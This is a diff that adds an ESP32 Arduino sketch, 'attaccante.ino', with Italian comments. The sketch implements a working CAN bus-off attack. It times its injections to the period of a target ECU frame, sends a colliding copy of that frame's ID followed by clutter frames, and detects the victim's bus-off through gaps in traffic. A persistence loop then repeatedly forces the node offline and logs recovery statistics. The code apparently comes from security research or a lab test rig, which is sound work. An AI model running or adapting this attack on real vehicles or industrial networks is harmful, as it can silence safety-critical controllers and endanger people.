@@ -1,0 +1,455 @@
+// attaccante.ino
+#include <ESP32-TWAI-CAN.hpp>
+#include "driver/twai.h"
+
+// ---------------------------------------------------------------
+// PIN
+// ---------------------------------------------------------------
+#define CAN_TX 4
+#define CAN_RX 5
+#define HEARTBEAT_PIN 8
+
+// ---------------------------------------------------------------
+// ID
+// ---------------------------------------------------------------
+#define TARGET_ID 0x07A
+#define PRECEDED_ID 0x001
+#define CLUTTER_ID 0x777
+#define TRIGGER_ID 0x600
+#define REPORT_ID 0x601
+
+// ---------------------------------------------------------------
+// Timing attacco: lascialo identico se questo setup funziona
+// ---------------------------------------------------------------
+#define ATTACK_ADVANCE_US 295
+#define CLUTTER_GAP_US 150
+#define N_CLUTTER 15
+#define BEF_CLUTTER_US 180
+
+#define N_SAMPLES 512
+#define MAX_ATTACK_ATTEMPTS 5000
+#define PERSIST_ATTEMPTS 25
+
+// 50 successi validi
+#define TARGET_VALID_BUSOFF 50
+
+// detection bus-off/recovery tramite gap osservato
+#define GAP_FACTOR_NUM 4
+#define GAP_FACTOR_DEN 1
+#define RECOVERY_TIMEOUT_US 3000000ULL   // 3 s max attesa recovery
+
+// ---------------------------------------------------------------
+// State machine
+// ---------------------------------------------------------------
+typedef enum {
+  STATE_IDLE,
+  STATE_MEASURE,
+  STATE_ATTACK,
+  STATE_PERSIST,
+  STATE_DONE
+} AttackState;
+
+typedef struct {
+  bool success;
+  uint32_t gap_us;
+} AttackResult;
+
+static volatile AttackState gState = STATE_IDLE;
+static uint32_t gPeriodUs = 0;
+static uint32_t gAttackAttempts = 0;
+static uint32_t gBusOffDetected = 0;
+static uint32_t gPersistAttempts = 0;
+static uint32_t gValidBusOffs = 0;
+static uint32_t gRecoveryUs[TARGET_VALID_BUSOFF];
+
+static uint32_t lastHeartbeatMs = 0;
+static bool heartbeatState = false;
+
+// ---------------------------------------------------------------
+// TX helpers
+// ---------------------------------------------------------------
+static inline void txFrame(uint32_t id, uint8_t dlc, const uint8_t *data) {
+  CanFrame f = { 0 };
+  f.identifier = id;
+  f.extd = 0;
+  f.data_length_code = dlc;
+  if (data && dlc > 0) memcpy(f.data, data, dlc);
+  ESP32Can.writeFrame(f);
+}
+
+static inline void txFrameDirect(uint32_t id, uint8_t dlc, uint8_t byte0) {
+  twai_message_t m = { 0 };
+  m.identifier = id;
+  m.extd = 0;
+  m.data_length_code = dlc;
+  m.data[0] = byte0;
+  twai_transmit(&m, pdMS_TO_TICKS(2));
+}
+
+// ---------------------------------------------------------------
+// RX helpers
+// ---------------------------------------------------------------
+static bool waitForId(uint32_t target_id, uint32_t timeout_us, CanFrame *out) {
+  uint64_t start = esp_timer_get_time();
+  CanFrame rx;
+  while ((esp_timer_get_time() - start) < timeout_us) {
+    if (ESP32Can.readFrame(rx, 0)) {
+      if ((rx.identifier & 0x7FF) == target_id) {
+        if (out) *out = rx;
+        return true;
+      }
+    }
+  }
+  return false;
+}
+
+static void drainRx(uint32_t duration_us) {
+  uint64_t start = esp_timer_get_time();
+  CanFrame rx;
+  while ((esp_timer_get_time() - start) < duration_us) {
+    ESP32Can.readFrame(rx, 0);
+  }
+}
+
+// ---------------------------------------------------------------
+// Stima periodo
+// ---------------------------------------------------------------
+static uint32_t measurePeriod() {
+  Serial.printf("[MEASURE] acquiring %d samples of 0x%03X...\n",
+                N_SAMPLES, TARGET_ID);
+  CanFrame rx;
+
+  while (!waitForId(TARGET_ID, 2000000, &rx)) {
+    Serial.println("[MEASURE] waiting for first frame...");
+  }
+
+  uint64_t prev = esp_timer_get_time();
+  uint64_t sum = 0;
+  uint32_t good = 0;
+
+  for (int i = 0; i < N_SAMPLES; i++) {
+    if (waitForId(TARGET_ID, 500000, &rx)) {
+      uint64_t now = esp_timer_get_time();
+      uint64_t d = now - prev;
+      if (d > 1000 && d < 500000) {
+        sum += d;
+        good++;
+      }
+      prev = now;
+    }
+    if ((i & 31) == 0) {
+      Serial.printf("[MEASURE] %d/%d\n", i, N_SAMPLES);
+    }
+  }
+
+  uint32_t avg = good > 0 ? (uint32_t)(sum / good) : 0;
+  Serial.printf("[MEASURE] avg_period = %u us (%u valid)\n", avg, good);
+  return avg;
+}
+
+// ---------------------------------------------------------------
+// Attacco + detection via gap osservato
+//
+// idea:
+// 1. aspetto un frame TARGET_ID e sincronizzo
+// 2. lancio l'attacco con timing invariato
+// 3. invece di cercare "silenzio per 1s", aspetto il prossimo TARGET_ID
+// 4. misuro il gap dal frame TARGET precedente al primo TARGET successivo
+// 5. se il gap supera una soglia (> 4 periodi), considero bus-off valido
+//
+// questo rileva anche bus-off brevi (~50ms) senza usare finestre enormi
+// ---------------------------------------------------------------
+static AttackResult sfboAttemptMeasureGap(uint32_t period_us) {
+  AttackResult res = { false, 0 };
+  CanFrame rx;
+
+  if (!waitForId(TARGET_ID, period_us * 6, &rx)) {
+    return res;
+  }
+
+  uint64_t t_prev_target = esp_timer_get_time();
+
+  int64_t sl = (int64_t)period_us - (int64_t)ATTACK_ADVANCE_US;
+  if (sl < 0) sl = 0;
+  esp_rom_delay_us((uint32_t)sl);
+
+  txFrame(PRECEDED_ID, 0, nullptr);
+  esp_rom_delay_us(10);
+
+  {
+    static const uint8_t zeros[3] = { 0x00, 0x00, 0x00 };
+    txFrame(TARGET_ID, 3, zeros);
+  }
+
+  esp_rom_delay_us(BEF_CLUTTER_US);
+
+  for (int i = 0; i < N_CLUTTER; i++) {
+    txFrameDirect(CLUTTER_ID, 1, 0xFF);
+    esp_rom_delay_us(CLUTTER_GAP_US);
+  }
+
+  esp_rom_delay_us(1000);
+
+  uint64_t gap_threshold_us = ((uint64_t)period_us * GAP_FACTOR_NUM) / GAP_FACTOR_DEN;
+  uint64_t deadline = esp_timer_get_time() + RECOVERY_TIMEOUT_US;
+
+  while (esp_timer_get_time() < deadline) {
+    if (ESP32Can.readFrame(rx, 0)) {
+      if ((rx.identifier & 0x7FF) == TARGET_ID) {
+        uint64_t t_now = esp_timer_get_time();
+        uint64_t gap = t_now - t_prev_target;
+        res.gap_us = (uint32_t)gap;
+
+        if (gap >= gap_threshold_us) {
+          res.success = true;
+          return res;
+        } else {
+          return res;
+        }
+      }
+    }
+  }
+
+  return res;
+}
+
+// ---------------------------------------------------------------
+// Persistence loop: usa stessa logica RAW, ma senza statistiche
+// ---------------------------------------------------------------
+static bool sfboAttemptRaw(uint32_t period_us) {
+  CanFrame rx;
+
+  if (!waitForId(TARGET_ID, period_us * 6, &rx)) {
+    return false;
+  }
+
+  int64_t sl = (int64_t)period_us - (int64_t)ATTACK_ADVANCE_US;
+  if (sl < 0) sl = 0;
+  esp_rom_delay_us((uint32_t)sl);
+
+  txFrame(PRECEDED_ID, 0, nullptr);
+  esp_rom_delay_us(10);
+
+  {
+    static const uint8_t zeros[3] = { 0x00, 0x00, 0x00 };
+    txFrame(TARGET_ID, 3, zeros);
+  }
+
+  esp_rom_delay_us(BEF_CLUTTER_US);
+
+  for (int i = 0; i < N_CLUTTER; i++) {
+    txFrameDirect(CLUTTER_ID, 1, 0xFF);
+    esp_rom_delay_us(CLUTTER_GAP_US);
+  }
+
+  esp_rom_delay_us(1000);
+
+  uint64_t t0 = esp_timer_get_time();
+  uint64_t threshold = ((uint64_t)period_us * GAP_FACTOR_NUM) / GAP_FACTOR_DEN;
+
+  while ((esp_timer_get_time() - t0) < RECOVERY_TIMEOUT_US) {
+    if (ESP32Can.readFrame(rx, 0)) {
+      if ((rx.identifier & 0x7FF) == TARGET_ID) {
+        uint64_t dt = esp_timer_get_time() - t0;
+        if (dt >= threshold) {
+          gBusOffDetected++;
+          return true;
+        } else {
+          return false;
+        }
+      }
+    }
+  }
+
+  return false;
+}
+
+static void persistLoop(uint32_t period_us) {
+  CanFrame rx;
+  uint32_t no_recovery = 0;
+
+  for (int i = 0; i < PERSIST_ATTEMPTS; i++) {
+    gPersistAttempts++;
+
+    uint64_t start = esp_timer_get_time();
+    bool recovered = false;
+
+    while ((esp_timer_get_time() - start) < 5000000ULL) {
+      if (ESP32Can.readFrame(rx, 0)) {
+        if ((rx.identifier & 0x7FF) == TARGET_ID) {
+          recovered = true;
+          break;
+        }
+      }
+    }
+
+    if (!recovered) {
+      no_recovery++;
+      if (no_recovery > 5) break;
+      i--;
+      vTaskDelay(pdMS_TO_TICKS(200));
+      continue;
+    }
+
+    no_recovery = 0;
+    sfboAttemptRaw(period_us);
+  }
+}
+
+// ---------------------------------------------------------------
+// Stats
+// ---------------------------------------------------------------
+static void printRecoveryStats() {
+  if (gValidBusOffs == 0) {
+    Serial.println("[RECOVERY] no valid samples");
+    return;
+  }
+
+  uint64_t sum = 0;
+  uint32_t minv = 0xFFFFFFFF;
+  uint32_t maxv = 0;
+
+  for (uint32_t i = 0; i < gValidBusOffs; i++) {
+    uint32_t v = gRecoveryUs[i];
+    Serial.printf("[RECOVERY] sample=%u gap_us=%u\n", i + 1, v);
+    if (v < minv) minv = v;
+    if (v > maxv) maxv = v;
+    sum += v;
+  }
+
+  Serial.printf("[RECOVERY] valid=%u min=%u avg=%u max=%u us\n",
+                gValidBusOffs,
+                minv,
+                (uint32_t)(sum / gValidBusOffs),
+                maxv);
+}
+
+// ---------------------------------------------------------------
+// Report
+// ---------------------------------------------------------------
+static void sendReport(uint8_t state) {
+  uint8_t d[8] = {
+    (uint8_t)(gAttackAttempts & 0xFF), (uint8_t)(gAttackAttempts >> 8),
+    (uint8_t)(gBusOffDetected & 0xFF), (uint8_t)(gBusOffDetected >> 8),
+    (uint8_t)(gValidBusOffs & 0xFF), (uint8_t)(gValidBusOffs >> 8),
+    state, 0xAA
+  };
+  txFrame(REPORT_ID, 8, d);
+}
+
+// ---------------------------------------------------------------
+// Main task
+// ---------------------------------------------------------------
+void attackTask(void *arg) {
+  CanFrame rx;
+
+  for (;;) {
+    switch (gState) {
+
+      case STATE_IDLE:
+        if (waitForId(TRIGGER_ID, 200000, &rx)) {
+          gState = STATE_MEASURE;
+          gAttackAttempts = 0;
+          gBusOffDetected = 0;
+          gPersistAttempts = 0;
+          gValidBusOffs = 0;
+          memset(gRecoveryUs, 0, sizeof(gRecoveryUs));
+        }
+        break;
+
+      case STATE_MEASURE:
+        gPeriodUs = measurePeriod();
+        if (gPeriodUs < 1000 || gPeriodUs > 500000) {
+          vTaskDelay(pdMS_TO_TICKS(200));
+        } else {
+          gState = STATE_ATTACK;
+        }
+        break;
+
+      case STATE_ATTACK:
+        if (gValidBusOffs >= TARGET_VALID_BUSOFF) {
+          gState = STATE_PERSIST;
+          break;
+        }
+
+        gAttackAttempts++;
+        sendReport(0x01);
+
+        {
+          AttackResult r = sfboAttemptMeasureGap(gPeriodUs);
+          if (r.success) {
+            gBusOffDetected++;
+            if (gValidBusOffs < TARGET_VALID_BUSOFF) {
+              gRecoveryUs[gValidBusOffs] = r.gap_us;
+              gValidBusOffs++;
+            }
+          }
+        }
+
+        if (gAttackAttempts >= MAX_ATTACK_ATTEMPTS && gValidBusOffs == 0) {
+          gState = STATE_DONE;
+        }
+        break;
+
+      case STATE_PERSIST:
+        sendReport(0x02);
+        persistLoop(gPeriodUs);
+        gState = STATE_DONE;
+        break;
+
+      case STATE_DONE:
+        sendReport(0x03);
+        printRecoveryStats();
+        Serial.printf("[TASK] DONE — attempts=%u busoff=%u valid=%u persist=%u period=%u us\n",
+                      gAttackAttempts, gBusOffDetected, gValidBusOffs, gPersistAttempts, gPeriodUs);
+        vTaskDelay(pdMS_TO_TICKS(5000));
+        gState = STATE_IDLE;
+        gAttackAttempts = 0;
+        gBusOffDetected = 0;
+        gPersistAttempts = 0;
+        gValidBusOffs = 0;
+        memset(gRecoveryUs, 0, sizeof(gRecoveryUs));
+        break;
+    }
+  }
+}
+
+// ---------------------------------------------------------------
+// Setup / loop
+// ---------------------------------------------------------------
+void setup() {
+  Serial.begin(115200);
+  delay(50);
+
+  pinMode(HEARTBEAT_PIN, OUTPUT);
+  digitalWrite(HEARTBEAT_PIN, HIGH);
+
+  twai_filter_config_t fConfig = TWAI_FILTER_CONFIG_ACCEPT_ALL();
+
+  if (!ESP32Can.begin(ESP32Can.convertSpeed(500),
+                      CAN_TX, CAN_RX,
+                      9,
+                      64,
+                      &fConfig, nullptr, nullptr)) {
+    digitalWrite(HEARTBEAT_PIN, LOW);
+    while (1) delay(1000);
+  }
+
+  uint32_t alerts = TWAI_ALERT_BUS_OFF |
+                    TWAI_ALERT_BUS_RECOVERED |
+                    TWAI_ALERT_ERR_PASS |
+                    TWAI_ALERT_TX_FAILED;
+  twai_reconfigure_alerts(alerts, nullptr);
+
+  xTaskCreate(attackTask, "ATK", 8192, NULL, 3, NULL);
+}
+
+void loop() {
+  uint32_t nowMs = millis();
+  if (nowMs - lastHeartbeatMs >= 500) {
+    lastHeartbeatMs = nowMs;
+    heartbeatState = !heartbeatState;
+    digitalWrite(HEARTBEAT_PIN, heartbeatState);
+  }
+  delay(20);
+}
